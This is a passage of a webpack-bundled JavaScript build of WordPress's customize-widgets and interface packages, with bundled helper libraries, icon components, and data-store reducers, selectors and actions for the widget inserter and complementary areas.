/******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 4403:
/***/ (function(module, exports) {

var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/
/* global define */

(function () {
	'use strict';

	var hasOwn = {}.hasOwnProperty;
	var nativeCodeString = '[native code]';

	function classNames() {
		var classes = [];

		for (var i = 0; i < arguments.length; i++) {
			var arg = arguments[i];
			if (!arg) continue;

			var argType = typeof arg;

			if (argType === 'string' || argType === 'number') {
				classes.push(arg);
			} else if (Array.isArray(arg)) {
				if (arg.length) {
					var inner = classNames.apply(null, arg);
					if (inner) {
						classes.push(inner);
					}
				}
			} else if (argType === 'object') {
				if (arg.toString !== Object.prototype.toString && !arg.toString.toString().includes('[native code]')) {
					classes.push(arg.toString());
					continue;
				}

				for (var key in arg) {
					if (hasOwn.call(arg, key) && arg[key]) {
						classes.push(key);
					}
				}
			}
		}

		return classes.join(' ');
	}

	if ( true && module.exports) {
		classNames.default = classNames;
		module.exports = classNames;
	} else if (true) {
		// register as 'classnames', consistent with npm package name
		!(__WEBPACK_AMD_DEFINE_ARRAY__ = [], __WEBPACK_AMD_DEFINE_RESULT__ = (function () {
			return classNames;
		}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),
		__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
	} else {}
}());


/***/ }),

/***/ 5619:
/***/ (function(module) {

"use strict";


// do not edit .js files directly - edit src/index.jst


  var envHasBigInt64Array = typeof BigInt64Array !== 'undefined';


module.exports = function equal(a, b) {
  if (a === b) return true;

  if (a && b && typeof a == 'object' && typeof b == 'object') {
    if (a.constructor !== b.constructor) return false;

    var length, i, keys;
    if (Array.isArray(a)) {
      length = a.length;
      if (length != b.length) return false;
      for (i = length; i-- !== 0;)
        if (!equal(a[i], b[i])) return false;
      return true;
    }


    if ((a instanceof Map) && (b instanceof Map)) {
      if (a.size !== b.size) return false;
      for (i of a.entries())
        if (!b.has(i[0])) return false;
      for (i of a.entries())
        if (!equal(i[1], b.get(i[0]))) return false;
      return true;
    }

    if ((a instanceof Set) && (b instanceof Set)) {
      if (a.size !== b.size) return false;
      for (i of a.entries())
        if (!b.has(i[0])) return false;
      return true;
    }

    if (ArrayBuffer.isView(a) && ArrayBuffer.isView(b)) {
      length = a.length;
      if (length != b.length) return false;
      for (i = length; i-- !== 0;)
        if (a[i] !== b[i]) return false;
      return true;
    }


    if (a.constructor === RegExp) return a.source === b.source && a.flags === b.flags;
    if (a.valueOf !== Object.prototype.valueOf) return a.valueOf() === b.valueOf();
    if (a.toString !== Object.prototype.toString) return a.toString() === b.toString();

    keys = Object.keys(a);
    length = keys.length;
    if (length !== Object.keys(b).length) return false;

    for (i = length; i-- !== 0;)
      if (!Object.prototype.hasOwnProperty.call(b, keys[i])) return false;

    for (i = length; i-- !== 0;) {
      var key = keys[i];

      if (!equal(a[key], b[key])) return false;
    }

    return true;
  }

  // true if both NaN, false otherwise
  return a!==a && b!==b;
};


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
!function() {
"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  initialize: function() { return /* binding */ initialize; },
  store: function() { return /* reexport */ store; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/customize-widgets/build-module/store/selectors.js
var selectors_namespaceObject = {};
__webpack_require__.r(selectors_namespaceObject);
__webpack_require__.d(selectors_namespaceObject, {
  __experimentalGetInsertionPoint: function() { return __experimentalGetInsertionPoint; },
  isInserterOpened: function() { return isInserterOpened; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/customize-widgets/build-module/store/actions.js
var actions_namespaceObject = {};
__webpack_require__.r(actions_namespaceObject);
__webpack_require__.d(actions_namespaceObject, {
  setIsInserterOpened: function() { return setIsInserterOpened; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/interface/build-module/store/actions.js
var store_actions_namespaceObject = {};
__webpack_require__.r(store_actions_namespaceObject);
__webpack_require__.d(store_actions_namespaceObject, {
  closeModal: function() { return closeModal; },
  disableComplementaryArea: function() { return disableComplementaryArea; },
  enableComplementaryArea: function() { return enableComplementaryArea; },
  openModal: function() { return openModal; },
  pinItem: function() { return pinItem; },
  setDefaultComplementaryArea: function() { return setDefaultComplementaryArea; },
  setFeatureDefaults: function() { return setFeatureDefaults; },
  setFeatureValue: function() { return setFeatureValue; },
  toggleFeature: function() { return toggleFeature; },
  unpinItem: function() { return unpinItem; }
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/interface/build-module/store/selectors.js
var store_selectors_namespaceObject = {};
__webpack_require__.r(store_selectors_namespaceObject);
__webpack_require__.d(store_selectors_namespaceObject, {
  getActiveComplementaryArea: function() { return getActiveComplementaryArea; },
  isComplementaryAreaLoading: function() { return isComplementaryAreaLoading; },
  isFeatureActive: function() { return isFeatureActive; },
  isItemPinned: function() { return isItemPinned; },
  isModalActive: function() { return isModalActive; }
});

;// CONCATENATED MODULE: external ["wp","element"]
var external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: external ["wp","blockLibrary"]
var external_wp_blockLibrary_namespaceObject = window["wp"]["blockLibrary"];
;// CONCATENATED MODULE: external ["wp","widgets"]
var external_wp_widgets_namespaceObject = window["wp"]["widgets"];
;// CONCATENATED MODULE: external ["wp","blocks"]
var external_wp_blocks_namespaceObject = window["wp"]["blocks"];
;// CONCATENATED MODULE: external ["wp","data"]
var external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: external ["wp","preferences"]
var external_wp_preferences_namespaceObject = window["wp"]["preferences"];
;// CONCATENATED MODULE: external ["wp","components"]
var external_wp_components_namespaceObject = window["wp"]["components"];
;// CONCATENATED MODULE: external ["wp","i18n"]
var external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: external ["wp","blockEditor"]
var external_wp_blockEditor_namespaceObject = window["wp"]["blockEditor"];
;// CONCATENATED MODULE: external ["wp","compose"]
var external_wp_compose_namespaceObject = window["wp"]["compose"];
;// CONCATENATED MODULE: external ["wp","hooks"]
var external_wp_hooks_namespaceObject = window["wp"]["hooks"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/error-boundary/index.js

/**
 * WordPress dependencies
 */






function CopyButton({
  text,
  children
}) {
  const ref = (0,external_wp_compose_namespaceObject.useCopyToClipboard)(text);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    variant: "secondary",
    ref: ref
  }, children);
}
class ErrorBoundary extends external_wp_element_namespaceObject.Component {
  constructor() {
    super(...arguments);
    this.state = {
      error: null
    };
  }
  componentDidCatch(error) {
    this.setState({
      error
    });
    (0,external_wp_hooks_namespaceObject.doAction)('editor.ErrorBoundary.errorLogged', error);
  }
  render() {
    const {
      error
    } = this.state;
    if (!error) {
      return this.props.children;
    }
    return (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.Warning, {
      className: "customize-widgets-error-boundary",
      actions: [(0,external_wp_element_namespaceObject.createElement)(CopyButton, {
        key: "copy-error",
        text: error.stack
      }, (0,external_wp_i18n_namespaceObject.__)('Copy Error'))]
    }, (0,external_wp_i18n_namespaceObject.__)('The editor has encountered an unexpected error.'));
  }
}

;// CONCATENATED MODULE: external ["wp","coreData"]
var external_wp_coreData_namespaceObject = window["wp"]["coreData"];
;// CONCATENATED MODULE: external ["wp","mediaUtils"]
var external_wp_mediaUtils_namespaceObject = window["wp"]["mediaUtils"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/block-inspector-button/index.js

/**
 * WordPress dependencies
 */





function BlockInspectorButton({
  inspector,
  closeMenu,
  ...props
}) {
  const selectedBlockClientId = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).getSelectedBlockClientId(), []);
  const selectedBlock = (0,external_wp_element_namespaceObject.useMemo)(() => document.getElementById(`block-${selectedBlockClientId}`), [selectedBlockClientId]);
  return (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.MenuItem, {
    onClick: () => {
      // Open the inspector.
      inspector.open({
        returnFocusWhenClose: selectedBlock
      });
      // Then close the dropdown menu.
      closeMenu();
    },
    ...props
  }, (0,external_wp_i18n_namespaceObject.__)('Show more settings'));
}
/* harmony default export */ var block_inspector_button = (BlockInspectorButton);

// EXTERNAL MODULE: ./node_modules/classnames/index.js
var classnames = __webpack_require__(4403);
var classnames_default = /*#__PURE__*/__webpack_require__.n(classnames);
;// CONCATENATED MODULE: external ["wp","keycodes"]
var external_wp_keycodes_namespaceObject = window["wp"]["keycodes"];
;// CONCATENATED MODULE: external ["wp","primitives"]
var external_wp_primitives_namespaceObject = window["wp"]["primitives"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/undo.js

/**
 * WordPress dependencies
 */

const undo = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M18.3 11.7c-.6-.6-1.4-.9-2.3-.9H6.7l2.9-3.3-1.1-1-4.5 5L8.5 16l1-1-2.7-2.7H16c.5 0 .9.2 1.3.5 1 1 1 3.4 1 4.5v.3h1.5v-.2c0-1.5 0-4.3-1.5-5.7z"
}));
/* harmony default export */ var library_undo = (undo);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/redo.js

/**
 * WordPress dependencies
 */

const redo = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M15.6 6.5l-1.1 1 2.9 3.3H8c-.9 0-1.7.3-2.3.9-1.4 1.5-1.4 4.2-1.4 5.6v.2h1.5v-.3c0-1.1 0-3.5 1-4.5.3-.3.7-.5 1.3-.5h9.2L14.5 15l1.1 1.1 4.6-4.6-4.6-5z"
}));
/* harmony default export */ var library_redo = (redo);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/plus.js

/**
 * WordPress dependencies
 */

const plus = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M18 11.2h-5.2V6h-1.6v5.2H6v1.6h5.2V18h1.6v-5.2H18z"
}));
/* harmony default export */ var library_plus = (plus);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/close-small.js

/**
 * WordPress dependencies
 */

const closeSmall = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12 13.06l3.712 3.713 1.061-1.06L13.061 12l3.712-3.712-1.06-1.06L12 10.938 8.288 7.227l-1.061 1.06L10.939 12l-3.712 3.712 1.06 1.061L12 13.061z"
}));
/* harmony default export */ var close_small = (closeSmall);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/store/reducer.js
/**
 * WordPress dependencies
 */


/**
 * Reducer tracking whether the inserter is open.
 *
 * @param {boolean|Object} state
 * @param {Object}         action
 */
function blockInserterPanel(state = false, action) {
  switch (action.type) {
    case 'SET_IS_INSERTER_OPENED':
      return action.value;
  }
  return state;
}
/* harmony default export */ var reducer = ((0,external_wp_data_namespaceObject.combineReducers)({
  blockInserterPanel
}));

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/store/selectors.js
const EMPTY_INSERTION_POINT = {
  rootClientId: undefined,
  insertionIndex: undefined
};

/**
 * Returns true if the inserter is opened.
 *
 * @param {Object} state Global application state.
 *
 * @example
 * ```js
 * import { store as customizeWidgetsStore } from '@wordpress/customize-widgets';
 * import { __ } from '@wordpress/i18n';
 * import { useSelect } from '@wordpress/data';
 *
 * const ExampleComponent = () => {
 *    const { isInserterOpened } = useSelect(
 *        ( select ) => select( customizeWidgetsStore ),
 *        []
 *    );
 *
 *    return isInserterOpened()
 *        ? __( 'Inserter is open' )
 *        : __( 'Inserter is closed.' );
 * };
 * ```
 *
 * @return {boolean} Whether the inserter is opened.
 */
function isInserterOpened(state) {
  return !!state.blockInserterPanel;
}

/**
 * Get the insertion point for the inserter.
 *
 * @param {Object} state Global application state.
 *
 * @return {Object} The root client ID and index to insert at.
 */
function __experimentalGetInsertionPoint(state) {
  if (typeof state.blockInserterPanel === 'boolean') {
    return EMPTY_INSERTION_POINT;
  }
  return state.blockInserterPanel;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/store/actions.js
/**
 * Returns an action object used to open/close the inserter.
 *
 * @param {boolean|Object} value                Whether the inserter should be
 *                                              opened (true) or closed (false).
 *                                              To specify an insertion point,
 *                                              use an object.
 * @param {string}         value.rootClientId   The root client ID to insert at.
 * @param {number}         value.insertionIndex The index to insert at.
 *
 * @example
 * ```js
 * import { store as customizeWidgetsStore } from '@wordpress/customize-widgets';
 * import { __ } from '@wordpress/i18n';
 * import { useDispatch } from '@wordpress/data';
 * import { Button } from '@wordpress/components';
 * import { useState } from '@wordpress/element';
 *
 * const ExampleComponent = () => {
 *   const { setIsInserterOpened } = useDispatch( customizeWidgetsStore );
 *   const [ isOpen, setIsOpen ] = useState( false );
 *
 *    return (
 *        <Button
 *            onClick={ () => {
 *                setIsInserterOpened( ! isOpen );
 *                setIsOpen( ! isOpen );
 *            } }
 *        >
 *            { __( 'Open/close inserter' ) }
 *        </Button>
 *    );
 * };
 * ```
 *
 * @return {Object} Action object.
 */
function setIsInserterOpened(value) {
  return {
    type: 'SET_IS_INSERTER_OPENED',
    value
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/store/constants.js
/**
 * Module Constants
 */
const STORE_NAME = 'core/customize-widgets';

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/store/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */





/**
 * Block editor data store configuration.
 *
 * @see https://github.com/WordPress/gutenberg/blob/HEAD/packages/data/README.md#registering-a-store
 *
 * @type {Object}
 */
const storeConfig = {
  reducer: reducer,
  selectors: selectors_namespaceObject,
  actions: actions_namespaceObject
};

/**
 * Store definition for the edit widgets namespace.
 *
 * @see https://github.com/WordPress/gutenberg/blob/HEAD/packages/data/README.md#createReduxStore
 *
 * @type {Object}
 */
const store = (0,external_wp_data_namespaceObject.createReduxStore)(STORE_NAME, storeConfig);
(0,external_wp_data_namespaceObject.register)(store);

;// CONCATENATED MODULE: ./node_modules/@wordpress/customize-widgets/build-module/components/inserter/index.js

/**
 * WordPress dependencies
 */







/**
 * Internal dependencies
 */

function Inserter({
  setIsOpened
}) {
  const inserterTitleId = (0,external_wp_compose_namespaceObject.useInstanceId)(Inserter, 'customize-widget-layout__inserter-panel-title');
  const insertionPoint = (0,external_wp_data_namespaceObject.useSelect)(select => select(store).__experimentalGetInsertionPoint(), []);
  return (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-layout__inserter-panel",
    "aria-labelledby": inserterTitleId
  }, (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-layout__inserter-panel-header"
  }, (0,external_wp_element_namespaceObject.createElement)("h2", {
    id: inserterTitleId,
    className: "customize-widgets-layout__inserter-panel-header-title"
  }, (0,external_wp_i18n_namespaceObject.__)('Add a block')), (0,external_wp_element_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    className: "customize-widgets-layout__inserter-panel-header-close-button",
    icon: close_small,
    onClick: () => setIsOpened(false),
    "aria-label": (0,external_wp_i18n_namespaceObject.__)('Close inserter')
  })), (0,external_wp_element_namespaceObject.createElement)("div", {
    className: "customize-widgets-layout__inserter-panel-content"
  }, (0,external_wp_element_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__experimentalLibrary, {
    rootClientId: insertionPoint.rootClientId,
    __experimentalInsertionIndex: insertionPoint.insertionIndex,
    showInserterHelpPanel: true,
    onSelect: () => setIsOpened(false)
  })));
}
/* harmony default export */ var components_inserter = (Inserter);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/external.js

/**
 * WordPress dependencies
 */

const external = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M19.5 4.5h-7V6h4.44l-5.97 5.97 1.06 1.06L18 7.06v4.44h1.5v-7Zm-13 1a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-3H17v3a.5.5 0 0 1-.5.5h-10a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5h3V5.5h-3Z"
}));
/* harmony default export */ var library_external = (external);

;// CONCATENATED MODULE: external ["wp","keyboardShortcuts"]
var external_wp_keyboardShortcuts_namespaceObject = window["wp"]["keyboardShortcuts"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/more-vertical.js

/**
 * WordPress dependencies
 */

const moreVertical = (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_wp_element_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M13 19h-2v-2h2v2zm0-6h-2v-2h2v2zm0-6h-2V5h2v2z"
}));
/* harmony default export */ var more_vertical = (moreVertical);

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/components/more-menu-dropdown/index.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */



function MoreMenuDropdown({
  as: DropdownComponent = external_wp_components_namespaceObject.DropdownMenu,
  className,
  /* translators: button label text should, if possible, be under 16 characters. */
  label = (0,external_wp_i18n_namespaceObject.__)('Options'),
  popoverProps,
  toggleProps,
  children
}) {
  return (0,external_wp_element_namespaceObject.createElement)(DropdownComponent, {
    className: classnames_default()('interface-more-menu-dropdown', className),
    icon: more_vertical,
    label: label,
    popoverProps: {
      placement: 'bottom-end',
      ...popoverProps,
      className: classnames_default()('interface-more-menu-dropdown__content', popoverProps?.className)
    },
    toggleProps: {
      tooltipPosition: 'bottom',
      ...toggleProps
    }
  }, onClose => children(onClose));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/components/index.js














;// CONCATENATED MODULE: external ["wp","deprecated"]
var external_wp_deprecated_namespaceObject = window["wp"]["deprecated"];
var external_wp_deprecated_default = /*#__PURE__*/__webpack_require__.n(external_wp_deprecated_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/store/actions.js
/**
 * WordPress dependencies
 */



/**
 * Set a default complementary area.
 *
 * @param {string} scope Complementary area scope.
 * @param {string} area  Area identifier.
 *
 * @return {Object} Action object.
 */
const setDefaultComplementaryArea = (scope, area) => ({
  type: 'SET_DEFAULT_COMPLEMENTARY_AREA',
  scope,
  area
});

/**
 * Enable the complementary area.
 *
 * @param {string} scope Complementary area scope.
 * @param {string} area  Area identifier.
 */
const enableComplementaryArea = (scope, area) => ({
  registry,
  dispatch
}) => {
  // Return early if there's no area.
  if (!area) {
    return;
  }
  const isComplementaryAreaVisible = registry.select(external_wp_preferences_namespaceObject.store).get(scope, 'isComplementaryAreaVisible');
  if (!isComplementaryAreaVisible) {
    registry.dispatch(external_wp_preferences_namespaceObject.store).set(scope, 'isComplementaryAreaVisible', true);
  }
  dispatch({
    type: 'ENABLE_COMPLEMENTARY_AREA',
    scope,
    area
  });
};

/**
 * Disable the complementary area.
 *
 * @param {string} scope Complementary area scope.
 */
const disableComplementaryArea = scope => ({
  registry
}) => {
  const isComplementaryAreaVisible = registry.select(external_wp_preferences_namespaceObject.store).get(scope, 'isComplementaryAreaVisible');
  if (isComplementaryAreaVisible) {
    registry.dispatch(external_wp_preferences_namespaceObject.store).set(scope, 'isComplementaryAreaVisible', false);
  }
};

/**
 * Pins an item.
 *
 * @param {string} scope Item scope.
 * @param {string} item  Item identifier.
 *
 * @return {Object} Action object.
 */
const pinItem = (scope, item) => ({
  registry
}) => {
  // Return early if there's no item.
  if (!item) {
    return;
  }
  const pinnedItems = registry.select(external_wp_preferences_namespaceObject.store).get(scope, 'pinnedItems');

  // The item is already pinned, there's nothing to do.
  if (pinnedItems?.[item] === true) {
    return;
  }
  registry.dispatch(external_wp_preferences_namespaceObject.store).set(scope, 'pinnedItems', {
    ...pinnedItems,
    [item]: true
  });
};

/**
 * Unpins an item.
 *
 * @param {string} scope Item scope.
 * @param {string} item  Item identifier.
 */
const unpinItem = (scope, item) => ({
  registry
}) => {
  // Return early if there's no item.
  if (!item) {
    return;
  }
  const pinnedItems = registry.select(external_wp_preferences_namespaceObject.store).get(scope, 'pinnedItems');
  registry.dispatch(external_wp_preferences_namespaceObject.store).set(scope, 'pinnedItems', {
    ...pinnedItems,
    [item]: false
  });
};

/**
 * Returns an action object used in signalling that a feature should be toggled.
 *
 * @param {string} scope       The feature scope (e.g. core/edit-post).
 * @param {string} featureName The feature name.
 */
function toggleFeature(scope, featureName) {
  return function ({
    registry
  }) {
    external_wp_deprecated_default()(`dispatch( 'core/interface' ).toggleFeature`, {
      since: '6.0',
      alternative: `dispatch( 'core/preferences' ).toggle`
    });
    registry.dispatch(external_wp_preferences_namespaceObject.store).toggle(scope, featureName);
  };
}

/**
 * Returns an action object used in signalling that a feature should be set to
 * a true or false value
 *
 * @param {string}  scope       The feature scope (e.g. core/edit-post).
 * @param {string}  featureName The feature name.
 * @param {boolean} value       The value to set.
 *
 * @return {Object} Action object.
 */
function setFeatureValue(scope, featureName, value) {
  return function ({
    registry
  }) {
    external_wp_deprecated_default()(`dispatch( 'core/interface' ).setFeatureValue`, {
      since: '6.0',
      alternative: `dispatch( 'core/preferences' ).set`
    });
    registry.dispatch(external_wp_preferences_namespaceObject.store).set(scope, featureName, !!value);
  };
}

/**
 * Returns an action object used in signalling that defaults should be set for features.
 *
 * @param {string}                  scope    The feature scope (e.g. core/edit-post).
 * @param {Object<string, boolean>} defaults A key/value map of feature names to values.
 *
 * @return {Object} Action object.
 */
function setFeatureDefaults(scope, defaults) {
  return function ({
    registry
  }) {
    external_wp_deprecated_default()(`dispatch( 'core/interface' ).setFeatureDefaults`, {
      since: '6.0',
      alternative: `dispatch( 'core/preferences' ).setDefaults`
    });
    registry.dispatch(external_wp_preferences_namespaceObject.store).setDefaults(scope, defaults);
  };
}

/**
 * Returns an action object used in signalling that the user opened a modal.
 *
 * @param {string} name A string that uniquely identifies the modal.
 *
 * @return {Object} Action object.
 */
function openModal(name) {
  return {
    type: 'OPEN_MODAL',
    name
  };
}

/**
 * Returns an action object signalling that the user closed a modal.
 *
 * @return {Object} Action object.
 */
function closeModal() {
  return {
    type: 'CLOSE_MODAL'
  };
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/store/selectors.js
/**
 * WordPress dependencies
 */




/**
 * Returns the complementary area that is active in a given scope.
 *
 * @param {Object} state Global application state.
 * @param {string} scope Item scope.
 *
 * @return {string | null | undefined} The complementary area that is active in the given scope.
 */
const getActiveComplementaryArea = (0,external_wp_data_namespaceObject.createRegistrySelector)(select => (state, scope) => {
  const isComplementaryAreaVisible = select(external_wp_preferences_namespaceObject.store).get(scope, 'isComplementaryAreaVisible');

  // Return `undefined` to indicate that the user has never toggled
  // visibility, this is the vanilla default. Other code relies on this
  // nuance in the return value.
  if (isComplementaryAreaVisible === undefined) {
    return undefined;
  }

  // Return `null` to indicate the user hid the complementary area.
  if (isComplementaryAreaVisible === false) {
    return null;
  }
  return state?.complementaryAreas?.[scope];
});
const isComplementaryAreaLoading = (0,external_wp_data_namespaceObject.createRegistrySelector)(select => (state, scope) => {
  const isVisible = select(external_wp_preferences_namespaceObject.store).get(scope, 'isComplementaryAreaVisible');
  const identifier = state?.complementaryAreas?.[scope];
  return isVisible && identifier === undefined;
});

/**
 * Returns a boolean indicating if an item is pinned or not.
 *
 * @param {Object} state Global application state.
 * @param {string} scope Scope.
 * @param {string} item  Item to check.
 *
 * @return {boolean} True if the item is pinned and false otherwise.
 */
const isItemPinned = (0,external_wp_data_namespaceObject.createRegistrySelector)(select => (state, scope, item) => {
  var _pinnedItems$item;
  const pinnedItems = select(external_wp_preferences_namespaceObject.store).get(scope, 'pinnedItems');
  return (_pinnedItems$item = pinnedItems?.[item]) !== null && _pinnedItems$item !== void 0 ? _pinnedItems$item : true;
});

/**
 * Returns a boolean indicating whether a feature is active for a particular
 * scope.
 *
 * @param {Object} state       The store state.
 * @param {string} scope       The scope of the feature (e.g. core/edit-post).
 * @param {string} featureName The name of the feature.
 *
 * @return {boolean} Is the feature enabled?
 */
const isFeatureActive = (0,external_wp_data_namespaceObject.createRegistrySelector)(select => (state, scope, featureName) => {
  external_wp_deprecated_default()(`select( 'core/interface' ).isFeatureActive( scope, featureName )`, {
    since: '6.0',
    alternative: `select( 'core/preferences' ).get( scope, featureName )`
  });
  return !!select(external_wp_preferences_namespaceObject.store).get(scope, featureName);
});

/**
 * Returns true if a modal is active, or false otherwise.
 *
 * @param {Object} state     Global application state.
 * @param {string} modalName A string that uniquely identifies the modal.
 *
 * @return {boolean} Whether the modal is active.
 */
function isModalActive(state, modalName) {
  return state.activeModal === modalName;
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/store/reducer.js
/**
 * WordPress dependencies
 */

function complementaryAreas(state = {}, action) {
  switch (action.type) {
    case 'SET_DEFAULT_COMPLEMENTARY_AREA':
      {
        const {
          scope,
          area
        } = action;

        // If there's already an area, don't overwrite it.
        if (state[scope]) {
          return state;
        }
        return {
          ...state,
          [scope]: area
        };
      }
    case 'ENABLE_COMPLEMENTARY_AREA':
      {
        const {
          scope,
          area
        } = action;
        return {
          ...state,
          [scope]: area
        };
      }
  }
  return state;
}

/**
 * Reducer for storing the name of the open modal, or null if no modal is open.
 *
 * @param {Object} state  Previous state.
 * @param {Object} action Action object containing the `name` of the modal
 *
 * @return {Object} Updated state
 */
function activeModal(state = null, action) {
  switch (action.type) {
    case 'OPEN_MODAL':
      return action.name;
    case 'CLOSE_MODAL':
      return null;
  }
  return state;
}
/* harmony default export */ var store_reducer = ((0,external_wp_data_namespaceObject.combineReducers)({
  complementaryAreas,
  activeModal
}));

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/store/constants.js
/**
 * The identifier for the data store.
 *
 * @type {string}
 */
const constants_STORE_NAME = 'core/interface';

;// CONCATENATED MODULE: ./node_modules/@wordpress/interface/build-module/store/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */





/**
